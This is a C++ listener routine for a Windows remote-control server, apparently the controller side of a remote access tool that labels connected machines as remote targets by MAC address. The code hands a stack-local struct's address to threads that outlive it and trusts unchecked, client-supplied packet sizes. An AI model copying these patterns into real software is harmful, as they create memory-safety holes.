

#include <windows.h>
#include <WinSock.h>
#include "main.h"
#include "Public.h"
#include "RemoteControlRecver.h"
#include "Commander.h"
#include "OnlineManager.h"
#include "RemoteControlListener.h"
#include "network.h"



int __stdcall RemoteControlServer::RemoteControlListener() {
	char szShowInfo[1024];

	int iRet = 0;
	int hSockListen = Network::listenPort(REMOTE_CONTROLPORT);


	while (TRUE) {
		sockaddr_in stAddrClient = { 0 };
		int iAddrSize = sizeof(sockaddr_in);

		SOCKET hSockClient = accept(hSockListen, (sockaddr*)&stAddrClient, &iAddrSize);
		if (hSockClient == 0 || hSockClient == INVALID_SOCKET)
		{
			WriteLog("RemoteControlListen accept error\r\n");
			continue;
		}
		else
		{
			DWORD dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
			if (setsockopt(hSockClient, SOL_SOCKET, SO_RCVTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
			{
				wsprintfA(szShowInfo, "RemoteControlListen recv time setsockopt error code:%u\r\n", GetLastError());
				WriteLog(szShowInfo);
				closesocket(hSockClient);
				continue;
			}

			dwSockTimeOut = DATASOCK_TIME_OUT_VALUE;
			if (setsockopt(hSockClient, SOL_SOCKET, SO_SNDTIMEO, (char*)&dwSockTimeOut, sizeof(DWORD)) == SOCKET_ERROR)
			{
				wsprintfA(szShowInfo, "RemoteControlListen send time setsockopt error code:%u\r\n", GetLastError());
				WriteLog(szShowInfo);
				closesocket(hSockClient);
				continue;
			}

			char tmphdr[MAX_WSPRINTF_BUFFER_SIZE];
			iRet = recv(hSockClient, tmphdr, MAX_WSPRINTF_BUFFER_SIZE, 0);
			NETWORKPACKETHEADER lphdr = *(LPNETWORKPACKETHEADER)tmphdr;
			UNIQUECLIENTSYMBOL stUnique = lphdr.unique;
			if ((iRet == sizeof(NETWORKPACKETHEADER) + sizeof(STREMOTECONTROLPARAMS)) && (lphdr.cmd == REMOTECONTROL_PARAMS) &&
				(lphdr.packlen == sizeof(STREMOTECONTROLPARAMS)))
			{
				char reply[MAX_WSPRINTF_BUFFER_SIZE];
				iRet = Commander::SendCmdPacket(&stUnique, hSockClient, reply, MAX_WSPRINTF_BUFFER_SIZE, RECV_DATA_OK);
				if (iRet)
				{
					STREMOTECONTROLPARAMS param = *(LPSTREMOTECONTROLPARAMS)(tmphdr + sizeof(NETWORKPACKETHEADER));

					//dwbmbitssize = ((bitmap.bmWidth * wbitcount+31)/32)* 4 * bitmap.bmHeight ;
					int remoteBufSize = ((param.screenx * param.bitsperpix + 31) / 32) * 4 * param.screeny + 0x1000;
					//bmpfilehdr bmpinfohdr palette

					char* lpClientBitmap = new char[remoteBufSize];
					if (lpClientBitmap == 0)
					{
						closesocket(hSockClient);
						WriteLog("RemoteControlListen new operator client bitmap buffer error\r\n");
						continue;;
					}

					REMOTE_CONTROL_PARAM stRemoteControlParam = { 0 };
					stRemoteControlParam.lpbmpDataSize = new int(0);
					stRemoteControlParam.hSockClient = hSockClient;
					stRemoteControlParam.stAddrClient = stAddrClient;
					stRemoteControlParam.lpControlWindowClose = new int(0);
					stRemoteControlParam.lpClientBitmap = lpClientBitmap;
					stRemoteControlParam.bufLimit = remoteBufSize;
					stRemoteControlParam.hwndWindow = FALSE;
					stRemoteControlParam.param = param;
					stRemoteControlParam.unique = stUnique;

					DWORD winthreadid = 0;
					HANDLE hThreadRemoteWindow = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RemoteControler::RemoteControlWindow,
						(LPVOID)&stRemoteControlParam,
						0, &winthreadid);
					CloseHandle(hThreadRemoteWindow);
					int cnt = 30;
					while (stRemoteControlParam.hwndWindow == FALSE && cnt > 0) {
						Sleep(100);
						cnt--;
					}

					if (cnt == 0)
					{
						delete stRemoteControlParam.lpbmpDataSize;
						delete stRemoteControlParam.lpControlWindowClose;
						closesocket(stRemoteControlParam.hSockClient);
						continue;;
					}

					RemoteCtrlParamMap.insert(map<HWND, REMOTE_CONTROL_PARAM>::value_type(stRemoteControlParam.hwndWindow, stRemoteControlParam));

					char szMac[MAX_PATH];
					wsprintfA(szMac, "Ô¶³ÌÄ¿±êMAC:%02X_%02X_%02X_%02X_%02X_%02X", stUnique.cMAC[0], stUnique.cMAC[1], stUnique.cMAC[2], stUnique.cMAC[3],
						stUnique.cMAC[4], stUnique.cMAC[5]);

					SetWindowTextA(stRemoteControlParam.hwndWindow, szMac);

					DWORD remotethreadid = 0;
					HANDLE hRemoteProcThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RemoteControler::RemoteControlProc,
						&stRemoteControlParam, 0, &remotethreadid);
					CloseHandle(hRemoteProcThread);

					iRet = OnlineManager::CheckIfOnlineExist(&stUnique, hSockClient, stAddrClient, lpClientBitmap, REMOTE_CONTROL_THREAD, winthreadid);

					Sleep(0);
					continue;
				}
				else {
					closesocket(hSockClient);
				}
			}
			else {
				closesocket(hSockClient);
			}
		}
		continue;
	}

	return FALSE;
}